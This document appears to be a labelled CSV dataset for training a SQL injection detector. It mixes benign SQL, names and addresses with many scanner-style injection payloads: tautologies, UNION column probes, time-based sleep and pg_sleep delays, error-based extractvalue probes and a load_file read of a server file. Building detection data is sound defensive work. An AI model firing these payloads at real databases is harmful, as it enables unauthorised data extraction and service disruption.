Query,Label
"1'||	(	select'alxi'	where 3967	=	3967and	2388	=benchmark	(	 5000000,md5	(0x6d457153	)		)#",1
SELECT * FROM region WHERE pattern LIKE '%take%',0
"c/ general merry del val, s/n",0
1')asmqxbwhere6496	= 6496	and	7533		=7533--,1
"-6554' 	) 	) 	 ) 	unionall select	4384,4384,4384,4384,4384#",1
86464472c,0
1'+	 (	select mrdiwhere 7451 	= 7451and8594	=  (	 select 8594from pg_sleep  (	5	)	 	 ) --,1
1'||(select	'glyc' from	dualwhere	4058 = 	4058,1
-7901)	orderby1--,1
"1"" )		asltblwhere 6395		= 6395",1
12230,0
-8264%'	)		orderby 1#,1
"1'	where 6905 =	6905union all	selectnull,null,null,null,null,null#",1
.espejo,0
SELECT * FROM hour FETCH FIRST 3 ROWS ONLY,0
1 	) 	or6793 =	 (select	6793frompg_sleep (	 5  )	 	)   and (7015		= 7015,1
09301966f,0
SELECT * FROM relationship,0
"SELECT * FROM ball WHERE feel NOT IN  ( 'share', 'each', 'baseball' )",0
SELECT AVG ( basis ) FROM broke SELECT SUM ( rule ),0
"-8950"")  )		as	uahswhere 2113=	2113	union allselect	2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",1
1and7533		=	 7533-- spzi,1
"1""	 	)			) 	)		or		(select *from	( select( sleep(	5 	))	 	)		sddo ) 	#",1
waitfor delay'0:0:5'and	((  ( '%'	=',1
almedina,0
"UPDATE tomorrow SET plant =  'or', City =  'nearer' WHERE garden =  pipe",0
SELECT * FROM layers FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM below,0
"selectcount	(	 *	)		fromgenerate_series	(1,5000000	) and'dfwj' = 'dfwj",1
"1' and8148	=	like ('abcdefg',upper 	(hex ( randomblob( 500000000/2   ) )	 )   ) --",1
"SELECT verb,blind,loss FROM hit LEFT JOIN Orders ON shore.careID =  string.water ORDER BY first.strike",0
SELECT * FROM in FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM women,0
"SELECT COUNT ( whispered ) , immediately FROM word BY thousand",0
nina,0
SELECT * FROM cool FETCH FIRST 3 ROWS ONLY,0
"-6478"" )		) 	 union all select7087,7087,7087,7087,7087,7087,7087,7087--",1
SELECT over ( s )  FROM brother SELECT actual ( s ),0
"1 or	8315	=	( select	count	 (	 *  )		from	sysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)	--cbsd",1
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,0
"1where5485		=	5485 or char(	117 )	||char	(	111	)		||char 	(	105  )||char(100) 	 	=regexp_substring 	( repeat(	 left (		crypt_key(  char( 65)||char ( 69 	)		||char (83	) ,null 	) 	,0	),500000000	 ),null)	--",1
"select*fromusers	where	id	=	1	or""{."" or	1	=1--1",1
1where 3802	=		3802and	2006	 =	2006,1
SELECT * FROM win FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cut,0
SELECT AVG ( wind ) FROM certain SELECT SUM ( hospital ),0
"-2718""or	2724in		 ( 	(		char	(	113 )	+char (113	) +char ( 112) +char ( 106	)		+char		(113) +		(select	 (casewhen	(  2724  =	2724		)	thenchar (	49	 )  	else char 	(48)end	 )	 	)+char(113)+char	( 122	) +char	( 118 	)  +char	(	122	)+char	(  113		) 	)   )	 and	""xwbf""	=	""xwbf",1
"calle toronja, 157",0
"-2397	 ))	asoizy	where	1746= 1746	union	allselect 1746,1746,1746,1746,1746,1746#",1
39152269j,0
"1%'	 )	and	8312	= dbms_pipe.receive_message (	chr		( 69		)||chr	( 	79	 ) ||chr(	101)	||chr(	68) ,5)	--",1
"-4465%' unionall	select	6196,6196,6196,6196,6196,6196,6196,6196--",1
"iif	 (	2869= 9448,1,1/0	)",1
"-5652%'	)	union	allselect4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
SELECT * FROM yellow ORDER BY saddle,0
"1'	)	 asjxqt where	4322=	4322orchar ( 75	)	||char (  70)||char		( 99	)||char (	83	 )	 = regexp_substring(	 repeat 	(left(crypt_key	 (char	( 65 )||char	 (	69	)	||char( 83	 ) ,null		),0	)	,500000000)	,null ) --",1
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367652 ),0
8.88987E+15,0
"1%') 	 unionall select	null,null,null,null,null,null,null,null,null,null--",1
DELETE FROM shinning,0
"1'+	(		select	dgntwhere4701 	=		4701	or7427 = dbms_pipe.receive_message	( chr	( 116 )||chr	( 	87 )	 ||chr(	90) ||chr( 109) ,5 ) --",1
"calle rio piguea, 5,",0
"SELECT recently,running,light,house,birth     (  (  onto JOIN nodded ON animal.held =  arrive.whom )   INNER JOIN olderON Orders.allow =  pair.awayID )",0
"1'+ (	selectbptuwhere7356	=	7356 (	select	 ( case when	(	 4587	=	4587 )	then regexp_substring	(repeat 	(  left(	 crypt_key (  char(65 )	 ||char 	( 69	 )||char(83  ) ,null		)  ,0	 ),500000000	),null 	)  	else char	 ( 76)	||char	( 65	 )	||char	(	102)	||char		(  72	 ) end )from  (	values  ( 0	) )	 )		 )	+'",1
or'1'  ='1'--,1
"c/ antonia lancha, 38, 1?h",0
SELECT * FROM far WHERE mass = 'birds',0
6180,0
SELECT forty ( s )  FROM grow,0
28815,0
"-7939"" )	or3958 =	 6909",1
ceccarelli urp,0
c/ rivera de los limonetes 98,0
selectcasewhen1802=7063then 1 elsenullend--,1
SELECT COUNT ( simply )  FROM standard,0
45908,0
limit,1
zarraga,0
42808198t,0
1')	)		and4595	= 4595#,1
"SELECT strong,molecular FROM coat WHERE coach = 'industrial' UNION SELECT frighten, moving FROM usual",0
escalona,0
1where	5691	 = 5691and		(	select*from	(	select (		sleep(	5 ) 	))	fzno	 ) 	--,1
SELECT * FROM brown WHERE Price NOT BETWEEN 10 AND 20,0
casacuberta delacerda,0
SELECT * FROM low  WHERE girl NOT LIKE '[courage]%',0
SELECT * FROM range WHERE indicate = 'discuss'  AND City = 'made',0
"SELECT stuck, however, horse FROM church WHERE deep  IS NULL",0
pelland,0
SELECT * FROM move WHERE religious = 'lost' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM pretty SELECT * FROM football FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM airplane,0
"SELECT * FROM rhyme WHERE meal IN  ( 'tail', 'smooth', 'month' )",0
"1'	)  	)	 	 and	elt (1210=	1210,sleep (5 ))	and	 (		 (	 'zizo' like 'zizo",1
"1"" where	5406 =	5406	and	extractvalue	(7982,concat (  0x5c,0x7171706a71,  (select  (		elt(		7982	 =	7982,1	 )  	)		  ) ,0x717a767a71) 	) --",1
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_2_link' LIMIT 1,0
"SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )",0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28551 )  ORDER BY meta_id ASC",0
SELECT * FROM sun WHERE that = 'window' LIMIT 3,0
"1"" )	 )   )		orelt( 	5873 	=5873,sleep	 ( 5 )	) #",1
zurueta olarte,0
47160,0
endand'icny'like'icny,1
8.77345E+15,0
12064316b,0
"1'		 )	 	) 	)   and char (	111	)||char (		77) ||char(121 )		||char	 (	 88)	= 	regexp_substring	(	repeat(left (	crypt_key( char (65	 ) ||char ( 	69 ) 	||char	(	 83 ) ,null),0	)	,500000000 	),null)	 and	  ( 	(  	(	'kpsg'like'kpsg",1
"select*from users where	id 	=	1+	$+*\unionselect	null,@@VERSION	-- 1",1
"consolacion 92, 12?h",0
hennon,0
select case	when 8975 = 2352then 1elsenullend--,1
"select *from userswhereid =	1or	""  (  1"" or1		= 1-- 1",1
"calle puruuela, 15 6?d",0
SELECT citizen ( s )  FROM news SELECT distant FROM hall,0
"1%""		)	 )	 and	3580  =	 ( select count (		* )		from domain.domains	as t1,domain.columns	as	t2,domain.tables	ast3  )	--",1
DELETE FROM review,0
SELECT bound ( s )  FROM teeth UNION,0
1'|| ( select'avxz' fromdual	where	7815	= 7815,1
SELECT COUNT ( herself )  FROM bush,0
"1'	 )	)	 )	orextractvalue	( 1297,concat(0x5c,0x7171706a71, (select 	(elt ( 1297		= 1297,1 )			)		)  ,0x717a767a71  ) 	 ) and	 ( 	(			( 'ccqs'=		'ccqs",1
"1%')	 and 8514		=		 (selectcount	(*)	 	fromdomain.domains as t1,domain.columns	as t2,domain.tablesas t3 ) 	and	( '%' 	=	'",1
"select	*fromuserswhereid		= 	1or ""?  (  ""or	1	=	1-- 1",1
"-9142%""		) 	)	 )	or 1570	 =		convert  (int, 	( select char(		113 	) +char (	 113	)		+char	(	112)+char(	 106 	)  +char (113	)	 +		(	select		(case	when  ( 1570 =1570	)	 	thenchar (49  )	elsechar ( 48 )	end  )		)	+char (113	) +char  (  122 )	+char( 118)	 +char( 122	)+char( 	113	) 	)		 )		and  	( (  (	 ""%"" = """,1
SELECT COUNT ( burstID ) FROM pocket,0
3.58067E+15,0
"1"" )	 )	 and elt		( 4249	=4249,7259		) and  	( 	(  	""xjdh""		=	""xjdh",1
"-1218' union	allselect2663,2663,2663,2663--",1
2.12404E+14,0
"-5529""or5903	= 	('qqpjq'|| 	( selectcase5903	when5903 then1else0	end	from	rdb$database	) 	||'qzvzq' )",1
SELECT * FROM character,0
"SELECT * FROM wonderful WHERE silly NOT IN  ( 'cry', 'character', 'rich' )",0
SELECT AVG ( star ) FROM scientist,0
-4615'	or4493	=utl_inaddr.get_host_address 	(	chr		(	113)	||chr ( 113) ||chr (112)  ||chr (	106) ||chr (	113  )	|| 	(		select		(	casewhen   (4493	=	4493) then 1 else0end)fromdual) ||chr	(	 113	)||chr	(  122	)	||chr 	( 118	)||chr(  122	)	||chr (113 )	 ),1
SELECT * FROM solid,0
1'	and	 (	3423=	7789) *7789	and 'pdia' like'pdia,1
SELECT * FROM system WHERE closer NOT BETWEEN 'smile' AND 'onto',0
SELECT COUNT ( examine ) FROM congress,0
"1""	))	 	aspqbswhere4409	=	 4409",1
bertilia,0
"and	1  =	   (  if  (		(	  load_file (	char( 	110,46,101,120,116 ))   <>char	(	39,39	 )  	)  ,1,0	) 	 ) 		;",1
SELECT nearly ( s )  FROM round LEFT JOIN,0
SELECT RADIANS ( 180 ) ;,0
"1' ) ( select	(casewhen 	(	5451	 =  5451)	 then	regexp_substring	(	repeat	( right		( char(		5451	)	,0	 )	,500000000  ) ,null		)	  else char (  108 ) ||char(  76 	)||char ( 	112	)	||char (		116)  end)  frominformation_schema.system_users	)",1
"1""	)rlike	 (	select* from		(  select	(	sleep	 (	5		 )			)) vwyq  ) #",1
"-8002'	)	) 	 	) 	union	allselect 6647,6647,6647--",1
"1'	)	 )	or	extractvalue ( 1297,concat( 0x5c,0x7171706a71,	(	select	( elt	( 1297	=		1297,1 	 )		)	 	)  ,0x717a767a71) 	) and (	 	('wgpg'like	'wgpg",1
"-1830"" 	 )	 ) 	asbptvwhere4805=4805 or	4144		=	 	( select	upper	 (	 xmltype (	chr (	60 )||chr	(58		)	||chr  ( 113	)	||chr	(		113	 ) ||chr (112 )||chr(106	)	 ||chr	 ( 113	)||	(		select( case	when		(	 4144 =4144	)  	then 1else0end )	from dual)||chr	(	113  )	||chr (122	)	||chr	( 118 	)||chr (	122	 )		||chr (	113 	)	||chr(62	)) 		)		from	dual )--",1
stratten,0
5ecom058a?8a,0
SELECT * FROM court WHERE his = 'perhaps',0
SELECT MIN ( around )  AS major FROM found,0
"SELECT strength, fox, pencil FROM trace WHERE hit  IS NULL",0
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM curve 3 SELECT * FROM water,0
"1"" )  )as	sqzh	where5672	=	5672	and5556 =	 (	selectcount( *) from	all_userst1,all_users t2,all_users t3,all_users	t4,all_userst5)	--",1
1'  )	 rlike	( select	 ( casewhen	( 	2671 =	4485		)  then	1 else0x28end	) 	) 	and (	 'ezco' like	'ezco,1
SELECT * FROM done WHERE remain = 'cow',0
"SELECT * FROM right WHERE upward IN  ( 'music', 'city', 'jet' )",0
SELECT shinning ( s )  FROM upward UNION ALL,0
FROM  ( SELECT DISTINCT shelf FROM grabbed ),0
SELECT * FROM because WHERE happily = 'hunt' FETCH FIRST 3 ROWS ONLY,0
SELECT space ( s )  FROM recently UNION ALL,0
SELECT AVG ( rice ) FROM car,0
"1%""	)	and8635=	 ( selectcount	(* )	from generate_series(1,5000000	)		) 	 --",1
1 	)as	zzipwhere5353	=	5353and3394	=3092,1
99eja36r9a,0
"1'	inbooleanmode		)	union	allselect	null,null,null,null,null,null,null#",1
SELECT rose ( s FROM glass RIGHT JOIN,0
"-1692')union all select7074,7074,7074,7074,7074,7074,7074#",1
"1""	orrow ( 1045,7562 	)	>(select	count (		*	),concat	 (	0x7171706a71, (  select	(		elt	(1045 	=1045,1) 	) 	 ),0x717a767a71,floor 	( rand	 (		0 )*2) 	) 	 xfrom  	(  select8488 union	select5584 union	select3051 union select 1210	) agroupby x	) 	 and	""xmvr"" =	""xmvr",1
SELECT * FROM  ( SELECT tin FROM success ),0
SELECT * FROM welcome,0
"1%"" and	elt 	(3114 = 3114,sleep	(5	))	#",1
-7742)	 as tgzqwhere	7842 =	7842 or2062	=1563,1
"1'		 )	 )	 )and(  select	2* 	(	if   (	 	 (		select* from ( select concat	 (		0x7171706a71,  ( select ( elt	(	3484	= 3484,1  )	 ) 	 ),0x717a767a71,0x78			)	 ) s )  ,8446744073709551610, 8446744073709551610			)	)   )	 and			( ( ('xpks' like'xpks",1
SELECT * FROM income WHERE chapter = 'distant'  AND City = 'pleasant',0
"-9858""	or8592 = 8553",1
-1643'	where 1968=	1968or	3484 = 6642,1
SELECT * FROM every WHERE mainly = 'thin'  OR story = 'length',0
"1"" )   where3321 =  3321",1
"select	count	(	 *)	fromsysibm.systablesast1,sysibm.systables	as t2,sysibm.systablesas	t3and 	 ( 	( 'btnl'= 'btnl",1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c97aab4686' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
30388165j,0
93310194e,0
trebaol@arroyomolinos-madrid.gq,0
"1""andelt 	(  4249 =		4249,7259 )",1
persaud,0
1%'or 4240	= ( select	4240 frompg_sleep	( 5		)	) 	 --,1
SELECT option_value FROM wp_options WHERE option_name  =  'options_number_of_preferred_partners' LIMIT 1,0
"INSERT INTO my ( beneath, clock, worth, cannot, how, bear )  VALUES  ( 'flame', 'knew'. save', 'opinion', 'smoke', 'satisfied', 'model' )",0
"SELECT shine,sharp,progress FROM slope LEFT JOIN Orders ON impossible.explanationID =  shape.good ORDER BY join.bee",0
"c/ concepcion alexandre 82,",0
"selectcount ( *) 	from generate_series ( 1,5000000	) 	and (	 'cewn'	= 'cewn",1
511amasa,0
SELECT COUNT ( gladID ) FROM pair,0
SELECT chemical ( s )  FROM offer UNION,0
1'+	(	select	nsri	where1202 = 	1202	and4595= 4595#,1
9226,0
detlefsen albornoz,0
urbon,0
"INSERT INTO plan  ( buffalo, particularly, pencil )  VALUES  ( 'danger', 'ready', 'bush' )",0
"1 )	 asobhjwhere1789= 	1789	or 2633 	=	dbms_pipe.receive_message		(	 chr	(	112	)||chr 	(65 	)||chr	( 	65)||chr	(	103),5 )	--",1
42569454l,0
"1"") ) and 8407  =		(selectcount 	(	 *	)fromgenerate_series  (1,5000000  ) )		and 	(	  (	 ""jydy""like""jydy",1
"-8869""where 3019 =3019 unionall	select 3019,3019,3019#",1
SELECT * FROM only WHERE    NOT acres = 'whale',0
SELECT window FROM zulu UNION SELECT lamp FROM entirely ORDER BY ability,0
DELETE FROM sick,0
-2233'or (	 1807 =	7274)	 *7274,1
SELECT * FROM suddenly WHERE    NOT public = 'class',0
SELECT currency_code FROM wp_houzez_currencies,0
xixian,0
"SELECT column_name ( s )  FROM vowel,softly",0
mamantona,0
van_eyk,0
SELECT laugh ( s FROM typical RIGHT JOIN,0
"-2787' union all select3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1
SELECT * FROM desk WHERE memory = 'nearest'  AND  ( someone = 'crowd' OR plate = 'could' ),0
5.22E+15,0
dierkes.casado5@firstchoicecoffee.ms,0
UPDATE evening SET describe = 'song'WHERE section = 'whenever',0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5fbcf5ac6f5bc' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT * FROM test FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM easier,0
SELECT lunch ( s FROM dead RIGHT JOIN,0
"1"")  where4520 = 4520",1
1'	)	as	tvqn	where	2967 = 	2967,1
"1%""	)unionall	selectnull,null,null,null,null--",1
"1	)		)   union	all selectnull,null,null,null,null,null,null,null,null--",1
SELECT safe ( s )  FROM over UNION ALL,0
SELECT * FROM trick FETCH FIRST 3 ROWS ONLY,0
nalec,0
